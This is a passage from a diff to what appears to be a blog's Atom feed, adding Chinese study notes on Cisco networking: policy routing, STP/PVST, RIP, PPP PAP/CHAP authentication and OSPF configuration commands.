80</p><p>R1(config-ext-nacl)#exit</p><p>R1(config)#ip access-list extended TELNET</p><p>R1(config-ext-nacl)#permit tcp any any eq 23</p><p><code>配置路由映射表</code></p><p>R1(config)#route-map CCIE permit 10</p><p>R1(config-route-map)#match ip address HTTP</p><p>R1(config-route-map)#set ip precedence flash</p><p>R1(config-route-map)#set ip next-hop 172.16.12.2</p><p>R1(config)#route-map CCIE permit 20</p><p>R1(config-route-map)#match ip address TELNET</p><p>R1(config-route-map)#set ip precedence critical</p><p>R1(config-route-map)#set ip next-hop 172.16.21.2</p><p><code>应用路由映射表</code></p><p>R1(config)#int f0/0</p><p>R1(config-if)#ip policy route-map CCIE</p><p>R1(config)#ip local policy route-map CCIE</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;策略路由：&quot;&gt;&lt;a href=&quot;#策略路由：&quot; class=&quot;headerlink&quot; title=&quot;策略路由：&quot;&gt;&lt;/a&gt;策略路由：&lt;/h1&gt;&lt;p&gt;策略路由提供了一种根据网络管理者制定的策略来进行数据包转发的机制。基于策略的路由比传统路由能力更强，使用更灵活，它使
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>STP生成树协议</title>
+    <link href="http://yoursite.com/2019/09/23/STP%E7%94%9F%E6%88%90%E6%A0%91%E5%8F%8APVST/"/>
+    <id>http://yoursite.com/2019/09/23/STP生成树及PVST/</id>
+    <published>2019-09-23T02:59:03.548Z</published>
+    <updated>2019-08-25T13:03:33.676Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="STP生成树协议介绍："><a href="#STP生成树协议介绍：" class="headerlink" title="STP生成树协议介绍："></a>STP生成树协议介绍：</h1><p><strong>交换机工作原理：</strong>根据MAC地址表转发数据帧，如果地址未知，则广播</p><p><strong>广播风暴的产生：</strong>当网络中存在物理环路，会产生广播风暴。</p><h3 id="STP生成树协议："><a href="#STP生成树协议：" class="headerlink" title="STP生成树协议："></a>STP生成树协议：</h3><p>当链路存在环路时，它会在逻辑上断开环路，防止广播风暴的产生。当线路出现故障，断开的接口被激活，恢复通信，充当备份线路的作用。</p><p><strong>STP算法：</strong></p><p>​    STP将一个环形网络生成无环拓扑的步骤：</p><p>​            第一步：选择根网桥（Root Bridge）</p><p>​            第二步：选择根端口（Root Ports）</p><p>​            第三步：选择指定端口（Designated Ports）</p><hr><p><strong>选择根网桥（Root Bridge）</strong></p><p>​    （1）如何选择根网桥</p><p>​            根据网桥ID（BID）选择根网桥，谁的优先级小，谁就是根网桥。如果优先级相同，谁的MAC地址小谁就是根网桥</p><p>​    （2）什么是网桥ID（BID）</p><p>​            每个网络只能有一个根桥，根桥具有最低的桥ID，根桥上的所有端口都是指定端口，选择根网桥的目的是为了给将生成的树形结构确定一个树根</p><p>​    （3）实例</p><p>​            <img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ah3tpb30j30dx08eaab.jpg" alt></p><hr><p><strong>选择根端口（Root Ports）</strong></p><p>​    （1）如何选择根端口</p><p>​            在非根网桥上选择一个到根网桥最近的端口作为根端口，选择依据是：</p><p>​            根路径成本（cost值）最低</p><p>​            直连网桥的网桥ID最小</p><p>​            直连网桥的端口ID最小</p><p>​    （2）什么是cost值</p><p>​            cost值是根路径成本，是网桥到根网桥的路径上所有链路的成本之和</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ah9xhqx1j30is04pwel.jpg" alt></p><p>​            根路径成本表：</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ahb0062oj30lu05mglk.jpg" alt></p><p>​    （3）什么是端口ID</p><p>​            <img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ahc78q6ij30c905ojr9.jpg" alt></p><p>​    （4）实例</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ahe9hjkmj30it09274w.jpg" alt></p><hr><p><strong>选择指定端口（Designated Ports）</strong></p><p>​    （1）选择指定端口依据</p><p>​            在每个网段上，选择1个指定端口，根桥上的端口全是指定端口。</p><p>​            非根桥上的指定端口：</p><p>​                    根路径成本【从非根桥到根桥】最低</p><p>​                    端口所在的网桥的ID值较小</p><p>​                    直连网桥的端口ID值较小</p><h3 id="生成树端口状态："><a href="#生成树端口状态：" class="headerlink" title="生成树端口状态："></a>生成树端口状态：</h3><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7kr2izhj30nn07tglt.jpg" alt></p><h3 id="生成树计数器："><a href="#生成树计数器：" class="headerlink" title="生成树计数器："></a>生成树计数器：</h3><p>交换机开机需要等待30秒时间开始转发数据，当某个正在使用的链路断掉。阻塞的端口需要50秒时间开始转发数据</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7mw95vkj30e7078t8m.jpg" alt></p><hr><h1 id="BPDU（桥协议数据单元）："><a href="#BPDU（桥协议数据单元）：" class="headerlink" title="BPDU（桥协议数据单元）："></a>BPDU（桥协议数据单元）：</h1><p>交换机怎么知道其他交换机的网桥ID？怎么知道哪个端口的根路径成本最小？</p><p>是因为交换机之间使用BPDU来交换STP信息，BPDU（Bridge Protocol Data Unit）使用组播发送BPDU，组播地址为：01-80-c2-00-00-00。</p><p>BPDU分为2种类型：</p><p>​    配置BPDU － 用于生成树计算</p><p>​    拓朴变更通告（TCN）BPDU － 用于通告网络拓朴的变化</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6aho529ggj30hz0dbaae.jpg" alt></p><hr><h3 id="STP使用BPDU选择根网桥："><a href="#STP使用BPDU选择根网桥：" class="headerlink" title="STP使用BPDU选择根网桥："></a><strong>STP使用BPDU选择根网桥：</strong></h3><p>（1）交换机启动时，假定自己是根网桥，在外发送的BPDU中，根网桥ID字段填写自己的网桥ID</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7eddlvaj30kr08274v.jpg" alt></p><p>（2）当接收到其他交换机发出的BPDU后，比较网桥ID，选择较小的添加到根网桥ID中</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7epn3noj30ls08caao.jpg" alt></p><hr><h3 id="STP使用BPDU计算根路径成本："><a href="#STP使用BPDU计算根路径成本：" class="headerlink" title="STP使用BPDU计算根路径成本："></a>STP使用BPDU计算根路径成本：</h3><p>（1）根网桥发送根路径成本为0的BPDU</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7iyuqcxj30n308swfr.jpg" alt></p><p>（2）其他交换机收到根网桥的BPDU后，在根路径成本上添加接收接口的路径成本，然后转发</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7j8u3rlj30kx08k0ty.jpg" alt></p><hr><h1 id="PVST（VLAN生成树）："><a href="#PVST（VLAN生成树）：" class="headerlink" title="PVST（VLAN生成树）："></a>PVST（VLAN生成树）：</h1><p>PVST是Cisco私有，为每个VLAN构造一颗生成树的生成树协议</p><p>PVST在实际中，配置网络中比较稳定的交换机为根网桥，利用PVST实现网络的负载均衡</p><h3 id="PVST配置命令："><a href="#PVST配置命令：" class="headerlink" title="PVST配置命令："></a>PVST配置命令：</h3><p>⚪启用生成树：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#spanning-tree vlan 10</span><br></pre></td></tr></table></figure><p>⚪设置根网桥：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#spanning-tree vlan 10 root primary/secondary</span><br></pre></td></tr></table></figure><p><code>-设置primary后，优先级变为24576，为主根桥</code></p><p><code>-设置secondary后，优先级变成28672，为次根桥</code></p><p>⚪修改网桥的优先级：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#spanning-tree vlan 10 priority Bridge-priority</span><br></pre></td></tr></table></figure><p><code>-优先级的值为4096的倍数</code></p><p>⚪修改端口成本:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config-if)#spanning-tree vlan 10 cost cost</span><br></pre></td></tr></table></figure><p>⚪修改端口优先级:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config-if)#spanning-tree vlan 10 port-priority priority</span><br></pre></td></tr></table></figure><p>⚪配置上行速链路:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#spanning-tree uplinkfast</span><br></pre></td></tr></table></figure><p>⚪配置端口速链路：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config-if)#spanning-tree portfast</span><br></pre></td></tr></table></figure><p>⚪查看生成树的配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch#show spanning-tree</span><br></pre></td></tr></table></figure><p>⚪查看某个VLAN的生成树详细信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch#show spanning-tree vlan 10 detail</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;STP生成树协议介绍：&quot;&gt;&lt;a href=&quot;#STP生成树协议介绍：&quot; class=&quot;headerlink&quot; title=&quot;STP生成树协议介绍：&quot;&gt;&lt;/a&gt;STP生成树协议介绍：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;交换机工作原理：&lt;/strong&gt;根据MAC地址表转
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>RIP路由协议</title>
+    <link href="http://yoursite.com/2019/09/23/RIP/"/>
+    <id>http://yoursite.com/2019/09/23/RIP/</id>
+    <published>2019-09-23T02:59:03.546Z</published>
+    <updated>2019-08-25T14:17:41.784Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="动态路由协议-RIP："><a href="#动态路由协议-RIP：" class="headerlink" title="动态路由协议-RIP："></a>动态路由协议-RIP：</h1><p>路由信息协议RIP（Routing Information Protocol）是基于距离矢量算法的路由协议，利用跳数来作为计量标准。</p><p>距离矢量路由协议是路由器定期将路由表的副本传递给邻居路由器并累计距离矢量。“距离”表示有多远，“矢量”表示在那个方向上</p><p><strong>RIP协议的管理距离为120</strong></p><hr><h3 id="RIP协议的工作原理："><a href="#RIP协议的工作原理：" class="headerlink" title="RIP协议的工作原理："></a>RIP协议的工作原理：</h3><p>路由器开始运行RIP，当路由器的更新周期30秒到了的时候，会向邻居发送路由表。</p><p>Metric：度量值，衡量一条路由好坏的值。发送路由表时Metric值会加1，学习路由时，会学习最佳路由，将Metric值小的路由放到路由表当中。</p><p><strong>RIP协议计数至无穷大的解决方法：</strong>定义最大跳数为15跳</p><p><strong>RIP协议路由环路解决方法：</strong></p><p>​        1、水平分割</p><p>​                -向原始信息的来源方向返回路由信息毫无用处</p><p>​        2、路由毒化和毒性逆转</p><p>​                -当A中的一条路断开后，路由器将已经断开的路由的距离通告为无穷大。并立刻开启触发更新，向B发送更新包。B收到更新包后，将断开的路由标记为“可能已断开”，忽略水平分割，进行毒性逆转，向C发送路由信息，告诉C可能已断开</p><p>​        3、抑制计时器</p><p>​                -路由器为网络中的“可能有故障”状态保留条目，以便为其它路由器重新计算拓扑更改留出时间</p><p>​        4、触发更新</p><p>​                -路由表发生变化时，路由器发送更新</p><hr><h3 id="RIP路由协议的版本："><a href="#RIP路由协议的版本：" class="headerlink" title="RIP路由协议的版本："></a>RIP路由协议的版本：</h3><p><strong>RIP v1：</strong></p><p>发送路由更新时不携带子网掩码，宣告主类网络，属于有类路由协议</p><p>发送路由更新时，目标地址为广播地址：255.255.255.255</p><p><strong>RIP v2：</strong></p><p>发送路由更新时携带子网掩码，属于无类路由协议</p><p>发送路由更新时，目标地址为组播地址：224.0.0.9</p><h3 id="RIP路由协议的配置："><a href="#RIP路由协议的配置：" class="headerlink" title="RIP路由协议的配置："></a>RIP路由协议的配置：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#router rip//进入rip协议配置</span><br><span class="line">R2(config-router)#version 2 //启用rip v2版本</span><br><span class="line">R2(config-router)#no auto-summary//关闭路由自动汇总</span><br><span class="line">R2(config-router)#network 192.168.12.0//通过RIP宣告直连网段</span><br><span class="line">R2(config)#interface f0/1//进入接口</span><br><span class="line">R2(config-if)#ip summary-address rip 172.16.0.0 255.255.252.0//RIP手动路由汇总</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;动态路由协议-RIP：&quot;&gt;&lt;a href=&quot;#动态路由协议-RIP：&quot; class=&quot;headerlink&quot; title=&quot;动态路由协议-RIP：&quot;&gt;&lt;/a&gt;动态路由协议-RIP：&lt;/h1&gt;&lt;p&gt;路由信息协议RIP（Routing Information Prot
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="路由协议" scheme="http://yoursite.com/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PPP协议</title>
+    <link href="http://yoursite.com/2019/09/23/PPP/"/>
+    <id>http://yoursite.com/2019/09/23/PPP/</id>
+    <published>2019-09-23T02:59:03.541Z</published>
+    <updated>2019-09-22T02:45:02.291Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="PPP协议："><a href="#PPP协议：" class="headerlink" title="PPP协议："></a>PPP协议：</h1><p>PPP是一种基于ISO的高级数据链路控制（ISO-HDLC）的WAN协议，工作在物理层和数据链接层。PPP基于开放式标准，并包括各种功能，这使它成为拨号连接和与用WAN连接的事实标准。能够控制数据链路的建立，能够对广域网的IP地址迚行分配和管理，允许同时采用多种网络层路由协议，能够配置和测试数据链路，能够有效进行错误检测。不与SLIP类似，PPP经常也是用于低速的串行链路，PPP优于HDLC的特点在于有认证机制，可以保证数据传输的安全性。</p><p><strong>PPP的优点：</strong></p><p>1、PPP支持在单根串行链路上运行多种协议，不只是IP协议</p><p>2、每一帧都有循环冗余检验</p><p>3、通信双方可以进行IP地址的动态协商（使用IP NCP）</p><p>4、不CSLIP类似，对TCP和IP报文首部进行压缩</p><p><strong>PPP包括以下三个部分：</strong></p><p>1、在串行链路上封装IP数据报的方法。PPP既支持数据为8位和无奇偶检验的异步模式（如大多数计算机上普遍存在的串行接口），还支持面向比特的同步链接</p><p>2、建立、配置和测试数据链路的链路控制协议（LCP：Link  Control Protocol）它允许通信双方进行协商，以确定不同的选项。负责对L1的物理层的链路，进行链路的建立、控制、维护</p><p>3、针对不同网络层协议的网络控制协议（NCP：Network   ControlProtocol）（IPCP＋CDPCP）体系。负责对L3的网络层，向下提供无差别的接口.负责建立和配置各种网络层协议 .当前RFC定义的网络层有IP、OSI网络层、DECnet以及AppleTalk。</p><p><strong>PPP的帧格式：</strong></p><p>PPP的帧格式在ISO标准的帧格式的基础上新增了两个字段</p><p>1、协议字段：指出第3层协议（如IP戒IPX）</p><p>2、LCP字段：使得PPP的功能得以实现。</p><p>每个帧都以标志字符0x7e开始和结束。PPP帧的前3个字段和最后两个字段不HDLC的格式是一样的。PPP协议不是面向比特的，因而所有的PPP帧长度都是整数个字节。</p><p>地址字段：值始终是0xff</p><p>控制字段：值为0x03</p><p>协议字段：</p><p>​                    0x0021–信息字段是IP数据报</p><p>​                    0xC021–信息字段是链路控制数据LCP</p><p>​                    0x8021–信息字段是网络控制数据NCP</p><p>​                    0xC023–信息字段是安全性认证PAP</p><p>​                    0xC223–信息字段是安全性认证CHAP</p><p>当信息字段中出现和标志字段一样的比特0x7E时，就必须采叏一些措施。因PPP协议是面向字符型的，所以它不能采用HDLC所使用的零比特插入法，而是使用一种特殊的字符填充。具体的做法是将信息字段中出现的每一个0x7E字节转发成2字节序列（0x7D，0x5E）。若信息字段中出现一个0x7D的字节，则将其转发成2字节序列（0x7D，0x5D）。若<br>信息字段中出现ASCII码的控制字符，则在该字符前面要加入一个0x7D字节。这样做的目的是防止这些表面上的ASCII码控制字符被错误地解释为控制字符。CRC字段：即FCS，帧检验序列。是一个循环冗余检验码，以检测数据帧中的错误。</p><p><strong>PPP的协商过程：</strong></p><p>1、Interface Serial0, changed<br>state to up (L1 up)；</p><p>2、LCP: State is Open  ；</p><p>3、PPP的认证（这是可选项目，如果进行认证，就必须成功，才有NCP的工作）；</p><p>4-1、se1 IPCP: State is Open (IP)；</p><p>4-2、se1 CDPCP: State is Open (cdp：show cdp neighbor)；</p><p>5：Line protocol on interface serial1,changed state to<br>up (L2up)。</p><p><strong>LCP包含了4大网络模块：</strong></p><p>1、认证（authentication:PAP/CHAP）</p><p>2、压缩（compress）</p><p>3、回拨（callback）</p><p>4、多链路捆绑（mulit-link）</p><p>如果一个接口上有peer neighbor-route，那么这台设备就会自动学习到对端接口的32位主机路由。</p><h1 id="PPP的认证和配置方式："><a href="#PPP的认证和配置方式：" class="headerlink" title="PPP的认证和配置方式："></a>PPP的认证和配置方式：</h1><p><strong>PAP认证：</strong></p><p>由被认证方发起，发送主认证方所配置的用户名和密码，并且是明文方式。<br>主认证方检查被认证方发来的用户名及密码看与自己配置的本地用户名和密码是否匹配<br>。</p><p><strong>CHAP认证：</strong></p><p>由主认证方主动发起，并且不会发送密码（这个用户名和密码是主认证端和被认证端都配置好的），而是发送一个随机数值。<br>被认证方收到主认证端发来的随机数值后，将随机数与密码进行hash加密运算，将运算出的值连同自己配置的用户名一起发送给主认证端，主认证端收到被认证端发来的用户名和hash值后，根据被认证端发来的用户名，查找自己本地用户数据库中相同的用户名及对应的密码，并将这个用户名对应的密码与自己发送给被认证端的随机数值也进行hash算法加密，将得出的hash值与被认证端发来的hash值进行比较，如果两端hash一致则表示认证成功，这样就避免了在网络中传输密码，提高安全性。</p><hr><p><strong>PAP认证配置方式：</strong></p><p>主认证端配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#interface s3/0</span><br><span class="line">R2(config)#ip address 192.168.1.2 255.255.255.0</span><br><span class="line">R2(config-if)#encapsulation ppp//封装ppp协议</span><br><span class="line">R2(config-if)#ppp authentication pap //启用pap认证</span><br><span class="line">R2(config-if)#peer default ip address pool pap-pool //创建名为pap-pool的地址池</span><br><span class="line">R2(config)#ip local pool pap-pool 192.168.1.10 192.168.1.20 //定义pap-pool池分配的地址范围</span><br><span class="line">R2(config)#username ccie password cisco //创建本地用户名和密码用于pap认证</span><br></pre></td></tr></table></figure><p>被认证端配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-if)#encapsulation ppp //封装ppp协议</span><br><span class="line">R1(config-if)#ppp pap sent-username ccie password  cisco //设置发送的ppp认证的用户名和密码</span><br><span class="line">R1(config-if)#ip negotiated//开启ip地址协商获取</span><br><span class="line">R1(config-if)#peer neighbor-route//学习对端接口的32位主机路由</span><br><span class="line">R1#show ip intface brief 查看S3/0接口是否获取到了ip地址</span><br></pre></td></tr></table></figure><hr><p><strong>CHAP认证配置方式：</strong></p><p>主认证端配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#interface s3/0</span><br><span class="line">R2(config-if)#ip address 192.168.1.2 255.255.255.0</span><br><span class="line">R2(config-if)#peer default ip address pool chap-pool//定义chap-pool地址池的地址范围</span><br><span class="line">R2(config-if)#encapsulation ppp//封装PPP协议</span><br><span class="line">R2(config-if)#ppp authentication chap//启用chap认证</span><br><span class="line">R2(config)#username ccie password cisco//创建chap认证用的本地用户名密码</span><br><span class="line">R2(config)#ip local pool chap-pool 192.168.1.10 192.168.1.20 //定义地址池分配的地址范围</span><br></pre></td></tr></table></figure><p>被认证端配置：</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;PPP协议：&quot;&gt;&lt;a href=&quot;#PPP协议：&quot; class=&quot;headerlink&quot; title=&quot;PPP协议：&quot;&gt;&lt;/a&gt;PPP协议：&lt;/h1&gt;&lt;p&gt;PPP是一种基于ISO的高级数据链路控制（ISO-HDLC）的WAN协议，工作在物理层和数据链接层。PPP基
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>OSPF-开放式最短路径优先协议</title>
+    <link href="http://yoursite.com/2019/09/23/OSPF/"/>
+    <id>http://yoursite.com/2019/09/23/OSPF/</id>
+    <published>2019-09-23T02:59:03.538Z</published>
+    <updated>2019-09-17T02:36:44.229Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="OSPF概述："><a href="#OSPF概述：" class="headerlink" title="OSPF概述："></a>OSPF概述：</h1><p>OSPF(Open Shortest Path First开放式最短路径优先）是一个内部网关协议(Interior Gateway Protocol，简称IGP），用于在单一自治系统内决策路由。是对链路状态路由协议的一种实现，隶属内部网关协议（IGP），故运作于自治系统内部。著名的迪克斯加算法被用来计算最短路径树。OSPF支持负载均衡和基于服务类型的选路，也支持多种路由形式，如特定主机路由和子网路由等。</p><h3 id="OSPF概述：-1"><a href="#OSPF概述：-1" class="headerlink" title="OSPF概述："></a>OSPF概述：</h3><p>1、通过交换hello数据包来创建邻居关系</p><p>2、以传播LSA代替路由表更新</p><p>3、将LSA泛洪到区域中得所有OSPF路由器，而不仅是直连路由器</p><p>4、收集由OSPF路由器生成的所有LSA以创建OSPF链路状态数据库</p><p>5、使用SPF算法计算到每个目的地的最短距离，并置于路由表中</p><p><strong>链路：</strong>路由器接口</p><p><strong>状态：</strong>描述接口以及它与邻居路由器的关系</p><p>LSA初次泛洪后，链路状态路由器将向所有其他路由器传递由事件触发的较小链路状态更新</p><h3 id="多区域OSPF："><a href="#多区域OSPF：" class="headerlink" title="多区域OSPF："></a>多区域OSPF：</h3><p>在同一个自治系统中，通过接口划分区域，在ABR（区域边界路由器）中划分。</p><p><strong>划分区域的好处：</strong></p><p>1、减少路由表的路由条目</p><p>2、拓朴发生改变时，只影响本区域的数据库</p><p>3、每隔30分钟泛数据库信息（周期和触发更新），划分区域后，只在本区域泛洪</p><p>4、网络设计灵活</p><h3 id="OSPF邻居状态："><a href="#OSPF邻居状态：" class="headerlink" title="OSPF邻居状态："></a>OSPF邻居状态：</h3><hr><p><strong>邻居关系：Hello数据包</strong>  </p><p>可使用命令debug ip ospf adj查看邻居建立的详细过程</p><p><strong>down</strong> 路由器A刚启动时，ospf处于down的状态，因为它还没有与其他路由器交换信息。它使用组播地址224.0.0.5发送hello分组。 </p><p><strong>init</strong>   所有运行ospf的路由器收到A的hello分组时，将A加入邻居列表中，这是init状态。</p><p><strong>2way</strong> 收到A的hello的路由器都向A发送单播应答，A收到后，将这些路由器加入邻居列表，所有路由器都建立了双向关系，进入了2way状态。</p><p><strong>Exstart</strong>  如果链路类型是广播网络（如以太网），接下来必须选举DR和BDR，选举结束后，路由器处于预启动Exstart状态。</p><p><strong>Exchange</strong>  然后交换链路状态数据库摘要，也就是交换DBD，这是Exchange状态。  </p><p><strong>Loading</strong>  DBD交换完毕后进入Loading状态  </p><p><strong>Full</strong> 路由器根据DBD发送LSR请求更新链路状态条目，对方用LSU进行响应。至此，双方都学到了路由条目，database完整，就是Full状态。</p><hr><p><strong>DR/BDR选取：</strong></p><p>（1）在多路访问网络中，DROTHER路由器只与DR与BDR建立邻接关系，DROTHER之间只建邻居关系。</p><p>（2）DR与BDR有自己的组播地址：224.0.0.6</p><p>（3）DR与BDR选取原则，首要因素是时间，其次是接口优先级（多路访问网络的接口优先级为1，点到点网络接口优先级为0。ip ospf priority 可以修改接口优先级，若为0则不参与DR选举，再次是路由器ID：先比环回接口，再比物理接口</p><p>（4）DR与BDR选取是非抢占的，以下情况会重选，重启ospf进程或路由器、参与的路由器都执行clear ip ospf process命令、DR故障、OSPF接口优先级为0。</p><p>（5）如果DR故障，BDR接管DR，如果BDR故障，选新的BDR。</p><h1 id="OSPF配置方法："><a href="#OSPF配置方法：" class="headerlink" title="OSPF配置方法："></a>OSPF配置方法：</h1><h3 id="配置单区域OSPF："><a href="#配置单区域OSPF：" class="headerlink" title="配置单区域OSPF："></a>配置单区域OSPF：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router（config)#router ospf 1//建立一个OSPF，ID号为1</span><br><span class="line">Router（config-router)#network 192.168.10.0 0.0.0.255 area 0//声明网络，区域为0</span><br></pre></td></tr></table></figure><hr><h3 id="配置OSPF负载均衡："><a href="#配置OSPF负载均衡：" class="headerlink" title="配置OSPF负载均衡："></a>配置OSPF负载均衡：</h3><ul><li><p>路径必须为等价路径</p></li><li><p>默认情况下，最多加入四条等价路由</p></li><li><p>通过更改配置，最多可以配置16条路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-router)# maximum-paths &lt;value&gt;</span><br></pre></td></tr></table></figure></li><li><p>可更改特殊链路的开销以确保路径等价于负载均衡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-router)# ip ospf &lt;value&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="配置OSPF身份验证："><a href="#配置OSPF身份验证：" class="headerlink" title="配置OSPF身份验证："></a>配置OSPF身份验证：</h3><p>1、OSPF身份验证可以基于端口、基于区域、基于链路进行验证</p><p>2、OSPF支持明文和MD5身份验证</p><p>3、路由器生成并检查每个OSPF数据包</p><p>4、路由器验证接收到的每个路由更新数据包的来源</p><p>5、配置“密钥”：每个参与的邻居都必须配置相同的密钥</p><p><strong>配置明文验证：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-if)#ip ospf authentication-key ccie   设置明文密码为ccie，两端密码要一直</span><br><span class="line">R1(config-if)#ip ospf authentication     开启认证</span><br></pre></td></tr></table></figure><p><strong>配置密文验证：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-if)#ip ospf message-digest-key 1 md5 ccie</span><br><span class="line">R1(config-if)#ip ospf authentication</span><br></pre></td></tr></table></figure><p><strong>配置区域认证：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-if)#ip ospf message-digest-key 1 md5 ccie</span><br><span class="line">R1(config-router)#area 1 authentication message-digest</span><br></pre></td></tr></table></figure><hr><h3 id="验证OSPF配置："><a href="#验证OSPF配置：" class="headerlink" title="验证OSPF配置："></a>验证OSPF配置：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1#show ip protocols//查看是否配置OSPF</span><br><span class="line">R1#show ip ospf neighbor//查看邻居表</span><br><span class="line">R1#show ip ospf database//查看链路状态数据库</span><br><span class="line">R1#show ip route ospf//查看路由表</span><br><span class="line">R1#show ip ospf//查看OSPF进程及相关信息</span><br><span class="line">R1#show ip ospf f0/0//查看OSPF接口信息</span><br></pre></td></tr></table></figure><hr><h3 id="OSPF路由手工汇总："><a href="#OSPF路由手工汇总：" class="headerlink" title="OSPF路由手工汇总："></a>OSPF路由手工汇总：</h3><p>1、区域间路由汇总必须在ABR上完成</p><p>2、外部路由汇总必须在ASBR上完成</p><p>3、“no-advertise”参数阻止传递汇总路由</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;OSPF概述：&quot;&gt;&lt;a href=&quot;#OSPF概述：&quot; class=&quot;headerlink&quot; title=&quot;OSPF概述：&quot;&gt;&lt;/a&gt;OSPF概述：&lt;/h1&gt;&lt;p&gt;OSPF(Open Shortest Path First开放式最短路径优先）是一个内部网关协议(I
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="路由协议" scheme="http://yoursite.com/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>IP地址介绍及VLSM</title>
+    <link href="http://yoursite.com/2019/09/23/IP%E5%9C%B0%E5%9D%80%E4%BB%8B%E7%BB%8D%E5%8F%8AVLSM/"/>
+    <id>http://yoursite.com/2019/09/23/IP地址介绍及VLSM/</id>
+    <published>2019-09-23T02:59:03.535Z</published>
+    <updated>2019-08-21T11:11:50.103Z</updated>
+    
